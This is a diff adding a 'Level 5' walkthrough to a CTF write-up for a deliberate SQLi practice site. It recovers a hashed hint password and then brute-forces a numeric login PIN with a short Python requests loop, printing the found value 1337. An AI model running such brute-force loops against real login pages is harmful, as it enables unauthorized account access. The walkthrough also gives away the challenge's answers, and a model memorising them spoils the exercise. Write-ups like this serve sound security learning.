@@ -147,3 +147,55 @@ Start:
 ###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
 
 ===========================================================================================================  
+
+## [Level 5](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-5)
+Start:  
+`[http://www.zixem.altervista.org/SQLi/login_lvl5.php](http://www.zixem.altervista.org/SQLi/login_lvl5.php)`  
+![Login Page](./lvl5-login-page.png)  
+View the Source code: `[view-source:http://www.zixem.altervista.org/SQLi/login_lvl5.php](view-source:http://www.zixem.altervista.org/SQLi/login_lvl5.php)`  
+```
+If you want a lead, enter this password.
+~~~~~~~~~~~~~~~~~~ password: d1fd6ef9af6cb677e09b1b0a68301e0c ~~~~~~~~~~~~~~~~~~~~~~
+       owh...it's hashed! maybe you could get some help from my md5 cracker...
+~~~~~~~~~~~~~~~~~~~~~~~~here: /SQLi/md5cracker.php~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+-->
+```
+=> Let's go to `[http://www.zixem.altervista.org/SQLi/md5cracker.php](http://www.zixem.altervista.org/SQLi/md5cracker.php)`  
+> insert your hash with GET method.
+> md5cracker.php?hash=**YourHashHere**
+
+=> Let's try it with `d1fd6ef9af6cb677e09b1b0a68301e0c`:  
+`[www.zixem.altervista.org/SQLi/md5cracker.php?hash=d1fd6ef9af6cb677e09b1b0a68301e0c](www.zixem.altervista.org/SQLi/md5cracker.php?hash=d1fd6ef9af6cb677e09b1b0a68301e0c)`  
+> Try the password: *zixemhf*
+> Return to the login page and get your next step.
+
+![Login Page 2](./lvl5-login-page2.png)  
+=> Ok, here is the script on Python:
+
+~~~
+import requests
+
+for i in range (0, 999999):
+    req = requests.get("http://www.zixem.altervista.org/SQLi/login_do.php?pass=" + str(i))
+    if "> - Wrong Pass" in req.text:
+        print("> - Wrong Pass : %d" %i)
+    else:
+        print("Pass Found : %d\n" %i)
+        break
+~~~  
+=> Pass found: 1337
+> root@Blue3:.../Zixem# py sqli-level5.py
+> ...
+> - Wrong Pass : 1334
+> - Wrong Pass : 1335
+> - Wrong Pass : 1336
+> - Pass Found : 1337
+
+##### Result: #####  
+`[http://www.zixem.altervista.org/SQLi/login_do.php?pass=1337](http://www.zixem.altervista.org/SQLi/login_do.php?pass=1337)`
+![Level 5 Result](./lvl5-result.png)  
+
+**Bazinga!**  
+###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
+
+===========================================================================================================  
